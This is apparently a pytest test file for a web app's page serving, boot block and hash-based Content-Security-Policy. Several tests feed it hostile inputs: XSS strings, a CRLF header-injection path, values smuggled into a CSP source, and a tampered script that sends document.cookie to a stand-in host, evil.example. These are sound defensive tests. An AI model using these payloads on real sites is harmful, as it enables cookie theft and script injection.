"""UI-1: serving and boot. The two pages, the boot block, the page headers and the hash-based Content-Security-Policy,
the static files and `mount` (docs/design/ui.md sections 4.1, 4.2 and 10; S3-web-01, -02, -09, -13).

Everything runs on temp trees (`pages_dir` and `static_dir` are parameters), so it does not wait for the page files of
UI-2 and UI-7. The tests marked "real page" run on those files as soon as they exist and skip with a reason until then.
"""
from __future__ import annotations

import ast
import base64
import hashlib
import http.client
import json
import os
import re
import shutil
import subprocess
import threading
import time
import warnings
from dataclasses import dataclass
from pathlib import Path
from typing import NamedTuple

import pytest
from fastapi import FastAPI
from fastapi.routing import iter_route_contexts
from pydantic import ValidationError

with warnings.catch_warnings():  # Starlette warns that its TestClient will want httpx2; nothing to act on here
    warnings.simplefilter("ignore")
    from fastapi.testclient import TestClient

import sutra_app.ui as ui
from sutra_app.ui import BootContext, BootMarkerError, boot as boot_mod, build_router, csp_header
from sutra_app.ui import inline_script_hashes, mount, mount_static, render_page
from sutra_app.ui import routes as routes_mod

TOKEN = "k3-" + "t" * 29  # 32 characters, like secrets.token_urlsafe(24)
VERSION = "0.1.0"
MARKER = "<!--SUTRA-BOOT-->"

THEME_JS = 'document.documentElement.setAttribute("data-theme", "dark");'
MAIN_JS = '\n  window.pageRan = "j2";\n'
HOME_JS = 'document.documentElement.setAttribute("data-theme", "light");'

J2_PAGE = f"""<!doctype html>
<html><head><meta charset="utf-8"><title>Team</title>
{MARKER}
<script src="/ui/js/sutra_ctx.js"></script>
<script>{THEME_JS}</script>
</head><body><div id="app"></div>
<script>{MAIN_JS}</script>
<script src="/ui/js/dept_ext.js"></script>
</body></html>
"""
HOME_PAGE = f"""<!doctype html>
<html><head><meta charset="utf-8"><title>Home</title>
{MARKER}
<script src="/ui/js/sutra_ctx.js"></script>
<script>{HOME_JS}</script>
</head><body><div id="chat"></div><script src="/ui/js/home.js"></script></body></html>
"""


def source_hash(text: str) -> str:
    """The CSP source of an inline script, computed here from the definition and not by the code under test."""
    return "'sha256-" + base64.b64encode(hashlib.sha256(text.encode("utf-8")).digest()).decode("ascii") + "'"


J2_HASHES = [source_hash(THEME_JS), source_hash(MAIN_JS)]
HOME_HASHES = [source_hash(HOME_JS)]


def expected_csp(hashes=()) -> str:
    script_src = " ".join(["'self'", *hashes])
    return (
        f"default-src 'self'; script-src {script_src}; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob:; "
        "frame-src 'self'; connect-src 'self'; object-src 'none'; base-uri 'self'; form-action 'self'; "
        "frame-ancestors 'self'"
    )


def directives(csp: str) -> dict[str, list[str]]:
    out = {}
    for part in csp.split(";"):
        tokens = part.split()
        if tokens:
            out[tokens[0]] = tokens[1:]
    return out


BOOT_BLOCK = re.compile(r'<script type="application/json" id="sutra-boot">(.*?)</script>', re.S)


def boot_of(html: str) -> dict:
    found = BOOT_BLOCK.findall(html)
    assert len(found) == 1, f"expected one boot block, found {len(found)}"
    return json.loads(found[0])


@dataclass(frozen=True)
class Row:
    """A DeptRow stand-in with the optional extras."""

    id: str
    name: str
    archived: bool = False
    merged_into_name: str = ""


class V1Row(NamedTuple):
    """The least a row may be: `id` and `name` (UI-D10)."""

    id: str
    name: str


TEAMS = {
    "web": Row("web", "Web"),
    "docs": Row("docs", "Docs & Notes"),
    "old": Row("old", "Old", archived=True, merged_into_name="Web"),
    "lost": Row("lost", "Lost", archived=True),
    "plain": V1Row("plain", "Plain"),
    "evil": Row("evil", "</script><script>alert(1)</script><!-- \u2028 \" \\ "),
}


class Lookup:
    """`Services.department` stand-in that remembers what it was asked."""

    def __init__(self, teams=None):
        self.teams = TEAMS if teams is None else teams
        self.asked: list[str] = []

    def __call__(self, dept_id):
        self.asked.append(dept_id)
        return self.teams.get(dept_id)


def build_tree(root: Path) -> tuple[Path, Path]:
    pages = root / "pages"
    pages.mkdir()
    (pages / "j2_ui.html").write_text(J2_PAGE, encoding="utf-8")
    (pages / "home.html").write_text(HOME_PAGE, encoding="utf-8")
    static = root / "static"
    for sub in ("js", "css", "vendor"):
        (static / sub).mkdir(parents=True)
    (static / "js" / "sutra_ctx.js").write_text("window.SutraCtx = {};\n", encoding="utf-8")
    (static / "css" / "j2.css").write_text(":root { --bg: #000; }\n", encoding="utf-8")
    (static / "vendor" / "d3.min.js").write_text("/* d3 */\n", encoding="utf-8")
    return pages, static


def make_app(pages: Path, static: Path | None = None, lookup: Lookup | None = None) -> tuple[FastAPI, Lookup]:
    lookup = lookup or Lookup()
    app = FastAPI()
    app.include_router(build_router(token=TOKEN, department=lookup, version=VERSION, pages_dir=pages))
    if static is not None:
        mount_static(app, static)
    return app, lookup


@pytest.fixture
def tree(tmp_path):
    return build_tree(tmp_path)


@pytest.fixture
def pages(tree):
    return tree[0]


@pytest.fixture
def static(tree):
    return tree[1]


@pytest.fixture
def client(pages, static):
    app, lookup = make_app(pages, static)
    test_client = TestClient(app, follow_redirects=False)
    test_client.lookup = lookup
    return test_client


# ------------------------------------------------------------------------------------------------------------------
# The id rule and BootContext
# ------------------------------------------------------------------------------------------------------------------
@pytest.mark.parametrize("value", ["web", "a", "7up", "A_b.c:d-e", "x" * 120, "web.identity", "j2-20261104-100004-7f3a"])
def test_url_id_accepts_the_generic_rule(value):
    assert boot_mod.is_url_id(value)


@pytest.mark.parametrize(
    "value",
    ["", "x" * 121, "a b", "a/b", "a\\b", "web\n", "\nweb", "..", ".", "caf\u00e9", "a%20b", "a\x00b", "<b>", None, 7],
)
def test_url_id_refuses_everything_else(value):
    assert not boot_mod.is_url_id(value)


def test_boot_context_has_exactly_the_documented_fields():
    ctx = BootContext(page="home", token=TOKEN, version=VERSION)
    assert ctx.model_dump() == {
        "page": "home",
        "token": TOKEN,
        "dept": "",
        "dept_label": "",
        "archived": False,
        "note": "",
        "version": VERSION,
    }


def test_boot_context_token_needs_sixteen_characters_and_is_not_echoed():
    BootContext(page="home", token="a" * 16, version=VERSION)
    with pytest.raises(ValidationError) as caught:
        BootContext(page="home", token="b" * 15, version=VERSION)
    assert "b" * 15 not in str(caught.value)  # a refused token must not land in a log


def test_boot_context_home_has_no_department():
    with pytest.raises(ValidationError):
        BootContext(page="home", token=TOKEN, dept="web", version=VERSION)


@pytest.mark.parametrize(
    "kwargs",
    [
        {"dept": "", "dept_label": "Web"},  # no id
        {"dept": "web", "dept_label": ""},  # no label
        {"dept": "a b", "dept_label": "Web"},  # id outside the rule
        {"dept": "..", "dept_label": "Web"},
        {"dept": "x" * 121, "dept_label": "Web"},
        {"dept": "web\n", "dept_label": "Web"},
    ],
)
def test_boot_context_department_page_needs_a_valid_id_and_a_label(kwargs):
    with pytest.raises(ValidationError) as caught:
        BootContext(page="dept", token=TOKEN, version=VERSION, **kwargs)
    assert TOKEN not in str(caught.value)  # a refusal by the page rules does not echo the token either
    BootContext(page="dept", token=TOKEN, version=VERSION, dept="web", dept_label="Web")


def test_boot_context_is_closed_frozen_and_strict():
    ok = dict(page="home", token=TOKEN, version=VERSION)
    with pytest.raises(ValidationError):
        BootContext(**ok, extra="x")
    with pytest.raises(ValidationError):
        BootContext(**{**ok, "page": "admin"})
    with pytest.raises(ValidationError):  # a page name outside the two, whatever else is right about the context
        BootContext(page="admin", token=TOKEN, dept="web", dept_label="Web", version=VERSION)
    with pytest.raises(ValidationError):
        BootContext(**ok, archived="yes")  # strict: no coercion of a flag
    with pytest.raises(ValidationError):
        BootContext(**{**ok, "version": 1})
    ctx = BootContext(**ok)
    with pytest.raises(ValidationError):
        ctx.token = "z" * 20


def test_archived_note_names_the_survivor():
    assert boot_mod.archived_note("Web") == "This team was merged into Web. Its history stays available."
    assert boot_mod.archived_note("  Web ") == "This team was merged into Web. Its history stays available."
    assert boot_mod.archived_note("") == "This team was merged into another team. Its history stays available."
    assert boot_mod.archived_note("   ") == "This team was merged into another team. Its history stays available."


# ------------------------------------------------------------------------------------------------------------------
# render_page
# ------------------------------------------------------------------------------------------------------------------
def test_render_page_replaces_the_one_marker_with_the_boot_block():
    boot = BootContext(page="dept", token=TOKEN, dept="web", dept_label="Web", version=VERSION)
    out = render_page(J2_PAGE, boot)
    assert MARKER not in out
    assert boot_of(out) == boot.model_dump()
    assert BOOT_BLOCK.sub(MARKER, out) == J2_PAGE  # nothing else in the page changed
    assert out.index("sutra-boot") < out.index("/ui/js/sutra_ctx.js")  # the block comes where the marker was


@pytest.mark.parametrize("html,found", [("<p>no marker</p>", 0), (f"{MARKER}<p></p>{MARKER}", 2)])
def test_render_page_fails_unless_the_marker_occurs_exactly_once(html, found):
    with pytest.raises(BootMarkerError, match=f"found {found}"):
        render_page(html, BootContext(page="home", token=TOKEN, version=VERSION))


def test_boot_marker_error_is_a_value_error():
    assert issubclass(BootMarkerError, ValueError)


def test_render_page_escapes_a_script_end_in_labels():
    hostile = '</script><script>alert(1)</script><!-- <script> " \\ \u2028 \u00e9 </SCRIPT >'
    boot = BootContext(page="dept", token=TOKEN, dept="web", dept_label=hostile, note=hostile, version=VERSION)
    out = render_page(J2_PAGE, boot)
    block = BOOT_BLOCK.search(out)
    assert block is not None
    assert "<" not in block.group(1) and "\u2028" not in block.group(1)  # every '<' is \u003c, the separator escaped
    assert "\\u003c/script" in block.group(1)
    assert json.loads(block.group(1))["dept_label"] == hostile  # and it round-trips
    # the page has the same scripts as before plus the one block: nothing closed or opened a script element
    assert out.lower().count("<script") == J2_PAGE.lower().count("<script") + 1
    assert out.lower().count("</script") == J2_PAGE.lower().count("</script") + 1


def test_render_page_block_is_not_executable_and_not_hashed():
    out = render_page(J2_PAGE, BootContext(page="home", token=TOKEN, version=VERSION))
    assert 'type="application/json"' in out
    assert inline_script_hashes(out) == J2_HASHES  # the block has attributes, so it adds no hash


# ------------------------------------------------------------------------------------------------------------------
# inline_script_hashes and csp_header
# ------------------------------------------------------------------------------------------------------------------
def test_inline_script_hash_matches_the_published_example():
    # the example of the MDN page on script-src: <script>doSomething();</script>
    assert inline_script_hashes("<script>doSomething();</script>") == [
        "'sha256-RFWPLDbv2BY+rCkDzsE+0fr8ylGr2R2faWMhq4lfEQc='"
    ]


def test_inline_script_hashes_of_the_test_pages():
    assert inline_script_hashes(J2_PAGE) == J2_HASHES  # two, in document order; the two src scripts are not inline
    assert inline_script_hashes(HOME_PAGE) == HOME_HASHES
    assert inline_script_hashes("<p>no scripts</p>") == []


@pytest.mark.parametrize(
    "tag",
    [
        '<script src="/x.js">',
        '<script type="application/json">',
        '<script type="module">',
        '<script nonce="abc">',
        "<script async>",
        "<script defer src=x>",
        "<scripts>",
        "<script-x>",
        "<xscript>",
        "<script/>",
    ],
)
def test_only_attribute_less_scripts_are_hashed(tag):
    assert inline_script_hashes(f"{tag}alert(1)</script>") == []


@pytest.mark.parametrize("open_tag,close_tag", [("<script>", "</script>"), ("<SCRIPT>", "</SCRIPT>"), ("<script >", "</script >"),
                                                ("<script\n\t>", "</script\n>"), ("<ScRiPt>", "</sCrIpT/>")])
def test_script_tags_are_found_as_the_html_parser_reads_them(open_tag, close_tag):
    assert inline_script_hashes(f"{open_tag}x(){close_tag}") == [source_hash("x()")]


def test_a_start_tag_inside_a_script_is_text_not_a_second_script():
    page = '<script>var t = "<script>"; var u = "x";</script><script>second</script>'
    assert inline_script_hashes(page) == [source_hash('var t = "<script>"; var u = "x";'), source_hash("second")]


def test_a_script_end_needs_a_delimiter_after_the_name():
    # </scripts> does not end a script element, so the text goes on to the real end tag
    assert inline_script_hashes('<script>var s = "</scripts>";</script>') == [source_hash('var s = "</scripts>";')]


def test_line_endings_are_normalised_like_the_html_parser():
    lf = source_hash("a\nb\nc")
    assert inline_script_hashes("<script>a\nb\nc</script>") == [lf]
    assert inline_script_hashes("<script>a\r\nb\r\nc</script>") == [lf]
    assert inline_script_hashes("<script>a\rb\rc</script>") == [lf]  # a lone CR becomes LF too
    assert inline_script_hashes("<script>a\r\n\rb</script>") == [source_hash("a\n\nb")]  # CRLF is one break, CR another


def test_whitespace_and_non_ascii_text_count():
    assert inline_script_hashes("<script> x </script>") == [source_hash(" x ")]
    assert inline_script_hashes("<script> x </script>") != inline_script_hashes("<script>x</script>")
    assert inline_script_hashes("<script>\u00e9\u20ac</script>") == [source_hash("\u00e9\u20ac")]  # UTF-8 bytes
    assert inline_script_hashes("<script></script>") == [source_hash("")]


def test_equal_scripts_are_each_listed_and_order_is_document_order():
    page = "<script>b</script><script>a</script><script>b</script>"
    assert inline_script_hashes(page) == [source_hash("b"), source_hash("a"), source_hash("b")]


def test_an_unclosed_script_is_ignored_and_scanning_is_linear():
    assert inline_script_hashes("<script>ok</script><script>never closed") == [source_hash("ok")]
    started = time.monotonic()
    assert inline_script_hashes("<script>" * 40000) == []
    assert time.monotonic() - started < 2


def test_csp_header_is_the_documented_policy():
    assert csp_header([]) == expected_csp()
    assert csp_header(J2_HASHES) == expected_csp(J2_HASHES)
    assert csp_header(tuple(HOME_HASHES)) == expected_csp(HOME_HASHES)  # any sequence


def test_unsafe_inline_is_in_style_src_and_never_in_script_src():
    policy = directives(csp_header(J2_HASHES))
    assert "'unsafe-inline'" not in policy["script-src"]
    assert "'unsafe-inline'" in policy["style-src"]
    assert policy["script-src"] == ["'self'", *J2_HASHES]
    for name in ("default-src", "frame-src", "connect-src", "base-uri", "form-action", "frame-ancestors"):
        assert policy[name] == ["'self'"]
    assert policy["object-src"] == ["'none'"]
    assert policy["img-src"] == ["'self'", "data:", "blob:"]
    assert "*" not in csp_header(J2_HASHES) and "unsafe-eval" not in csp_header(J2_HASHES)


def test_csp_header_lists_a_hash_once_in_first_seen_order():
    a, b = source_hash("a"), source_hash("b")
    assert directives(csp_header([b, a, b, a]))["script-src"] == ["'self'", b, a]


@pytest.mark.parametrize(
    "source",
    [
        "'unsafe-inline'",
        "'self'",
        "*",
        "sha256-" + "A" * 43 + "=",  # not quoted
        "'sha256-short'",
        "'sha256-" + "A" * 43 + "'",  # no padding
        "'sha256-" + "A" * 44 + "='",  # too long
        "'sha384-" + "A" * 43 + "='",
        "'sha256-" + "A" * 43 + "=' https://evil.example",  # a second source smuggled in
        "'sha256-" + "A" * 43 + "='; script-src *",
        "'sha256-" + "A" * 43 + "='\n",
        "",
    ],
)
def test_csp_header_refuses_anything_but_a_sha256_source(source):
    with pytest.raises(ValueError, match="not a CSP sha256 source"):
        csp_header([source])


# ------------------------------------------------------------------------------------------------------------------
# The pages
# ------------------------------------------------------------------------------------------------------------------
@pytest.mark.parametrize(
    "path,boot,hashes",
    [
        ("/", {"page": "home", "token": TOKEN, "dept": "", "dept_label": "", "archived": False, "note": "",
               "version": VERSION}, HOME_HASHES),
        ("/d/web/", {"page": "dept", "token": TOKEN, "dept": "web", "dept_label": "Web", "archived": False, "note": "",
                     "version": VERSION}, J2_HASHES),
    ],
)
def test_a_page_is_200_with_its_boot_block_and_headers(client, path, boot, hashes):
    for response in (client.get(path), client.head(path)):
        assert response.status_code == 200
        assert response.headers["content-type"] == "text/html; charset=utf-8"
        assert response.headers["cache-control"] == "no-store"
        assert response.headers["x-content-type-options"] == "nosniff"
        assert response.headers["referrer-policy"] == "no-referrer"
        assert response.headers["content-security-policy"] == expected_csp(hashes)
    body = client.get(path).text
    assert boot_of(body) == boot
    assert MARKER not in body
    assert BOOT_BLOCK.sub(MARKER, body) == (J2_PAGE if path != "/" else HOME_PAGE)
    assert client.head(path).content == b""


def test_the_csp_hash_list_equals_the_inline_scripts_of_the_served_page(client):
    for path, page_hashes in (("/d/web/", J2_HASHES), ("/", HOME_HASHES)):
        response = client.get(path)
        served_scripts = re.findall(r"<script>(.*?)</script>", response.text, re.S)  # attribute-less ones, found here
        assert [source_hash(text) for text in served_scripts] == page_hashes
        assert directives(response.headers["content-security-policy"])["script-src"] == ["'self'", *page_hashes]
    assert len(J2_HASHES) == 2 and len(HOME_HASHES) == 1


def test_the_department_page_asks_the_lookup_once_and_uses_its_name(client):
    response = client.get("/d/docs/")
    assert response.status_code == 200
    assert client.lookup.asked == ["docs"]
    assert boot_of(response.text)["dept"] == "docs"
    assert boot_of(response.text)["dept_label"] == "Docs & Notes"


def test_a_tampered_inline_script_is_not_covered(pages, static):
    app, _ = make_app(pages, static)
    client = TestClient(app, follow_redirects=False)
    before = directives(client.get("/d/web/").headers["content-security-policy"])["script-src"]
    tampered = J2_PAGE.replace('window.pageRan = "j2";', 'fetch("//evil.example/?" + document.cookie);')
    (pages / "j2_ui.html").write_text(tampered, encoding="utf-8")
    os.utime(pages / "j2_ui.html", ns=(0, 2_000_000_000))  # a new version of the file, whatever the clock says
    after = directives(client.get("/d/web/").headers["content-security-policy"])["script-src"]
    tampered_hash = source_hash(MAIN_JS.replace('window.pageRan = "j2";', 'fetch("//evil.example/?" + document.cookie);'))
    assert tampered_hash not in before  # the policy served for the original page does not allow it
    assert after == ["'self'", J2_HASHES[0], tampered_hash]  # the policy follows the file, so it allows what is there
    assert J2_HASHES[1] not in after  # and no longer the old script


def test_the_page_file_is_read_and_hashed_once_per_version_of_the_file(pages, static, monkeypatch):
    calls = []
    real = routes_mod.inline_script_hashes
    monkeypatch.setattr(routes_mod, "inline_script_hashes", lambda html: calls.append(len(html)) or real(html))
    app, _ = make_app(pages, static)
    client = TestClient(app, follow_redirects=False)
    for _ in range(3):
        for path in ("/d/web/", "/d/docs/", "/", "/d/web/"):
            assert client.get(path).status_code == 200
    assert len(calls) == 2  # one hash pass per page file, not per request

    path = pages / "j2_ui.html"
    stat = path.stat()
    path.write_text(J2_PAGE.replace('"j2"', '"j3"'), encoding="utf-8")  # same size, new content
    os.utime(path, ns=(stat.st_atime_ns, stat.st_mtime_ns + 5_000_000_000))  # and a new mtime
    assert 'window.pageRan = "j3"' in client.get("/d/web/").text
    assert len(calls) == 3  # only that file was read again

    # the version of a file is its mtime and size: restoring both makes the cache see no change
    stat = path.stat()
    path.write_text(J2_PAGE.replace('"j2"', '"j4"'), encoding="utf-8")
    os.utime(path, ns=(stat.st_atime_ns, stat.st_mtime_ns))
    assert 'window.pageRan = "j3"' in client.get("/d/web/").text
    assert len(calls) == 3

    # a new size alone is a new version
    path.write_text(J2_PAGE.replace('"j2"', '"j55"'), encoding="utf-8")
    os.utime(path, ns=(stat.st_atime_ns, stat.st_mtime_ns))
    assert 'window.pageRan = "j55"' in client.get("/d/web/").text
    assert len(calls) == 4


def test_the_cache_stamp_describes_the_bytes_that_were_read(pages, static, monkeypatch):
    """A page file rewritten between the stat and the read is read once: the stamp comes from the open file."""
    calls = []
    real_hashes = routes_mod.inline_script_hashes
    monkeypatch.setattr(routes_mod, "inline_script_hashes", lambda html: calls.append(1) or real_hashes(html))
    target = pages / "j2_ui.html"
    raced = []
    real_stat = Path.stat

    def racing_stat(self, *args, **kwargs):
        result = real_stat(self, *args, **kwargs)
        if self == target and not raced:
            raced.append(True)  # a writer arrives right after the stat
            target.write_text(J2_PAGE.replace('"j2"', '"j33"'), encoding="utf-8")
            os.utime(target, ns=(0, 7_000_000_000))
        return result

    monkeypatch.setattr(Path, "stat", racing_stat)
    app, _ = make_app(pages, static)
    client = TestClient(app, follow_redirects=False)
    assert 'window.pageRan = "j33"' in client.get("/d/web/").text  # the read saw the new bytes
    assert 'window.pageRan = "j33"' in client.get("/d/web/").text
    assert len(calls) == 1  # and the next request found the stamp of exactly those bytes


def test_the_boot_block_is_per_request_while_the_file_is_cached(client):
    first = boot_of(client.get("/d/web/").text)
    second = boot_of(client.get("/d/docs/").text)
    assert (first["dept"], second["dept"]) == ("web", "docs")
    assert first["token"] == second["token"] == TOKEN


def test_a_team_name_cannot_break_out_of_the_boot_block(client):
    response = client.get("/d/evil/")
    assert response.status_code == 200
    assert boot_of(response.text)["dept_label"] == TEAMS["evil"].name
    assert "</script><script>alert(1)" not in response.text
    assert response.text.lower().count("<script") == J2_PAGE.lower().count("<script") + 1


def test_a_row_with_only_id_and_name_is_a_normal_team(client):
    boot = boot_of(client.get("/d/plain/").text)
    assert (boot["dept"], boot["dept_label"], boot["archived"], boot["note"]) == ("plain", "Plain", False, "")


def test_an_archived_team_opens_with_the_banner(client):
    boot = boot_of(client.get("/d/old/").text)
    assert boot["archived"] is True
    assert boot["note"] == "This team was merged into Web. Its history stays available."
    assert boot["dept_label"] == "Old"
    assert boot_of(client.get("/d/lost/").text)["note"] == (
        "This team was merged into another team. Its history stays available."
    )
    assert client.get("/d/old/").status_code == 200


@pytest.mark.parametrize("dept", ["nosuchteam", "a%20b", "%2e%2e", "web%0A", "%3Cscript%3E", "x" * 121, "caf%C3%A9"])
def test_an_unknown_or_malformed_team_is_a_404_page(client, dept):
    response = client.get(f"/d/{dept}/")
    assert response.status_code == 404
    assert response.headers["content-type"] == "text/html; charset=utf-8"
    assert "No team called" in response.text
    assert 'href="/"' in response.text
    assert "<script" not in response.text.lower()
    assert response.headers["cache-control"] == "no-store"
    assert response.headers["x-content-type-options"] == "nosniff"
    assert response.headers["referrer-policy"] == "no-referrer"
    assert response.headers["content-security-policy"] == expected_csp()
    assert MARKER not in response.text and "sutra-boot" not in response.text  # no token on an error page
    assert TOKEN not in response.text


def test_the_lookup_is_asked_only_about_ids_that_pass_the_rule(client):
    for dept in ("nosuchteam", "a%20b", "%2e%2e", "web%0A", "x" * 121):
        client.get(f"/d/{dept}/")
    assert client.lookup.asked == ["nosuchteam"]


def test_a_path_that_cannot_hold_a_team_is_a_404_too(client):
    for path in ("/d/..%2fx/", "/d/", "/d//", "/d/a/b/", "/e/web/"):
        assert client.get(path).status_code == 404


def test_the_404_page_shows_a_cut_escaped_printable_id(client):
    hostile = client.get("/d/%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E/")
    assert "&lt;img src=x onerror=alert(1)&gt;" in hostile.text and "<img" not in hostile.text
    long = client.get("/d/" + "z" * 200 + "/")
    assert "z" * 80 + "..." in long.text and "z" * 81 not in long.text
    control = client.get("/d/a%01b/")
    assert "a\ufffdb" in control.text and "\x01" not in control.text
    exact = client.get("/d/" + "y" * 80 + "x/")  # 81 characters: cut after 80
    assert "y" * 80 + "..." in exact.text and "yx" not in exact.text
    full = client.get("/d/" + "w" * 80 + "/")  # 80 characters: shown whole
    assert "w" * 80 + "</code>" in full.text and "..." not in full.text


def test_dept_without_the_slash_redirects_with_308_and_keeps_the_query(client):
    response = client.get("/d/web")
    assert response.status_code == 308
    assert response.headers["location"] == "/d/web/"
    assert response.headers["cache-control"] == "no-store"
    response = client.get("/d/web?view=detail&run=j2-20261104-100004-7f3a&q=%2F+x%20y")
    assert response.status_code == 308
    assert response.headers["location"] == "/d/web/?view=detail&run=j2-20261104-100004-7f3a&q=%2F+x%20y"
    assert client.head("/d/web?tab=graph").headers["location"] == "/d/web/?tab=graph"
    assert client.lookup.asked == []  # the redirect decides nothing; the page it points to does


def test_a_redirect_carries_the_cache_rule_and_nothing_else_of_a_page(client):
    for path in ("/d/web", "/?dept=web"):
        headers = client.get(path).headers
        assert headers["cache-control"] == "no-store"
        for name in ("content-security-policy", "x-content-type-options", "referrer-policy"):
            assert name not in headers
        assert client.get(path).content == b""


def test_dept_redirect_quotes_what_it_was_given(client):
    assert client.get("/d/a%20b").headers["location"] == "/d/a%20b/"
    location = client.get("/d/x%0d%0aSet-Cookie:%20a=b").headers["location"]
    assert "\r" not in location and "\n" not in location
    assert location.startswith("/d/") and location.endswith("/") and not location.startswith("//")
    assert client.get("/d/a:b").headers["location"] == "/d/a:b/"
    # characters that would change the meaning of the target if they went out raw
    assert client.get("/d/a%3Fb").headers["location"] == "/d/a%3Fb/"  # not a query
    assert client.get("/d/a%23b").headers["location"] == "/d/a%23b/"  # not a fragment
    assert client.get("/d/100%25").headers["location"] == "/d/100%25/"  # not a broken escape
    assert client.get("/d/a%3Fb?x=1").headers["location"] == "/d/a%3Fb/?x=1"


def test_the_home_shim_sends_a_known_team_to_its_page(client):
    cases = {
        "/?dept=web&view=detail": "/d/web/?view=detail",
        "/?view=detail&dept=web&tab=orgchart": "/d/web/?view=detail&tab=orgchart",
        "/?dept=web": "/d/web/",
        "/?dept=web&run=j2-20261104-100004-7f3a": "/d/web/?run=j2-20261104-100004-7f3a",
        "/?x=%2F%7e&dept=web&y=a+b": "/d/web/?x=%2F%7e&y=a+b",  # other parameters byte for byte
        "/?%64ept=web": "/d/web/",  # the key may be percent-encoded
        "/?dept=old&view=simple": "/d/old/?view=simple",  # an archived team still opens, with its banner
        "/?dept=web&": "/d/web/",
        "/?dept=web&&view=simple": "/d/web/?view=simple",
    }
    for source, target in cases.items():
        response = client.get(source)
        assert response.status_code == 308, source
        assert response.headers["location"] == target, source
        assert response.headers["cache-control"] == "no-store", source


def test_the_home_shim_ignores_dept_when_it_is_not_a_known_team(client):
    ignored = ["/?dept=", "/?dept=nosuch", "/?dept=a%20b", "/?dept=..", "/?dept=web%0A", "/?dept=web&dept=docs",
               "/?dept=" + "x" * 121, "/?dept=web;x", "/?DEPT=web", "/?dept2=web", "/?view=detail"]
    for source in ignored:
        response = client.get(source)
        assert response.status_code == 200, source
        boot = boot_of(response.text)
        assert (boot["page"], boot["dept"]) == ("home", ""), source
        assert response.headers["content-security-policy"] == expected_csp(HOME_HASHES)
    assert "a b" not in client.lookup.asked and "web\n" not in client.lookup.asked  # failed the rule first
    assert ".." not in client.lookup.asked and "" not in client.lookup.asked


def test_favicon_answers_204(client):
    for response in (client.get("/favicon.ico"), client.head("/favicon.ico")):
        assert response.status_code == 204
        assert response.content == b""


def test_the_routes_answer_get_and_head_only(client):
    for path in ("/", "/d/web/", "/d/web", "/d/web/library", "/d/web/library/", "/console", "/favicon.ico"):
        for method in ("POST", "PUT", "PATCH", "DELETE"):
            assert client.request(method, path).status_code == 405, (method, path)
    router = build_router(token=TOKEN, department=Lookup(), version=VERSION)
    assert {route.path for route in router.routes} == {"/", "/d/{dept}", "/d/{dept}/", "/d/{dept}/library", "/d/{dept}/library/", "/console",
                                                       "/favicon.ico"}
    for route in router.routes:
        assert set(route.methods) == {"GET", "HEAD"}


# ------------------------------------------------------------------------------------------------------------------
# The team's template library: /d/{dept}/library (J2 sync 4, D141)
# ------------------------------------------------------------------------------------------------------------------
def test_the_library_page_is_the_team_page_under_its_own_path_with_the_same_boot_block_and_policy(client):
    page = client.get("/d/web/")
    for path in ("/d/web/library", "/d/web/library"):
        for response in (client.get(path), client.head(path)):
            assert response.status_code == 200
            assert response.headers["content-type"] == "text/html; charset=utf-8"
            assert response.headers["cache-control"] == "no-store"
            assert response.headers["x-content-type-options"] == "nosniff"
            assert response.headers["referrer-policy"] == "no-referrer"
            assert response.headers["content-security-policy"] == expected_csp(J2_HASHES)
    library = client.get("/d/web/library")
    assert library.text == page.text                                  # one page file, one boot block: J2's script tells the two apart by the path
    assert boot_of(library.text) == {"page": "dept", "token": TOKEN, "dept": "web", "dept_label": "Web", "archived": False, "note": "",
                                     "version": VERSION}
    assert client.head("/d/web/library").content == b"" and MARKER not in library.text
    assert library.headers["content-security-policy"] == page.headers["content-security-policy"]


def test_the_library_page_asks_the_lookup_about_the_team_in_its_path_and_an_archived_team_opens_it_too(client):
    assert client.get("/d/docs/library").status_code == 200
    assert client.lookup.asked == ["docs"]
    old = client.get("/d/old/library")
    assert old.status_code == 200 and boot_of(old.text)["archived"] is True and boot_of(old.text)["dept"] == "old"
    assert boot_of(client.get("/d/evil/library").text)["dept_label"].startswith("</script>")          # the escaping of the boot block holds here too
    assert client.get("/d/evil/library").text.count("</script>") == client.get("/d/evil/").text.count("</script>")


@pytest.mark.parametrize("dept", ["nosuchteam", "a%20b", "%2e%2e", "web%0A", "%3Cscript%3E", "x" * 121, "caf%C3%A9"])
def test_an_unknown_or_malformed_team_has_no_library_page_either(client, dept):
    response = client.get(f"/d/{dept}/library")
    assert response.status_code == 404
    assert "No team called" in response.text and "<script" not in response.text.lower()
    assert response.headers["content-security-policy"] == expected_csp() and response.headers["cache-control"] == "no-store"
    assert MARKER not in response.text and "sutra-boot" not in response.text and TOKEN not in response.text


def test_the_library_path_with_a_slash_redirects_with_308_and_keeps_the_query(client):
    response = client.get("/d/web/library/")
    assert response.status_code == 308 and response.headers["location"] == "/d/web/library"
    assert response.headers["cache-control"] == "no-store"
    for name in ("content-security-policy", "x-content-type-options", "referrer-policy"):
        assert name not in response.headers
    assert response.content == b""
    query = "view=artifact&business=Still%20Point&q=%2F+x&mock=hide&open=prd/problem/generic/v1&tab=agent"
    assert client.get(f"/d/web/library/?{query}").headers["location"] == f"/d/web/library?{query}"
    assert client.head("/d/web/library/?q=1").headers["location"] == "/d/web/library?q=1"
    assert client.get("/d/a:b/library/").headers["location"] == "/d/a:b/library"
    assert client.get("/d/a%20b/library/").headers["location"] == "/d/a%20b/library"
    assert client.get("/d/a%3Fb/library/?x=1").headers["location"] == "/d/a%3Fb/library?x=1"
    assert client.lookup.asked == []                                  # the redirect decides nothing; the page it points to does


def test_only_the_team_has_a_library_page_there_is_no_global_one_and_nothing_below_it(client):
    for path in ("/library", "/library/", "/d/web/library/x", "/d/web/library/x/", "/d/web/library//", "/d//library", "/d/web/libraries",
                 "/d/web/Library", "/d/web/library.html"):
        assert client.get(path).status_code in (404, 307, 308), path
    assert client.get("/library").status_code == 404 and client.get("/d/web/library/x").status_code == 404
    assert client.lookup.asked == []


def test_a_team_called_library_keeps_its_page_and_has_a_library_page_of_its_own(pages, static):
    app, lookup = make_app(pages, static, Lookup({"library": Row("library", "Library")}))
    client = TestClient(app, follow_redirects=False)
    assert client.get("/d/library/").status_code == 200 and boot_of(client.get("/d/library/").text)["dept"] == "library"
    assert client.get("/d/library/library").status_code == 200 and boot_of(client.get("/d/library/library").text)["dept"] == "library"
    assert client.get("/d/library").headers["location"] == "/d/library/"
    assert client.get("/d/library/library/").headers["location"] == "/d/library/library"
    assert lookup.asked == ["library"] * 4                              # the two GETs of each page; the redirects ask nobody
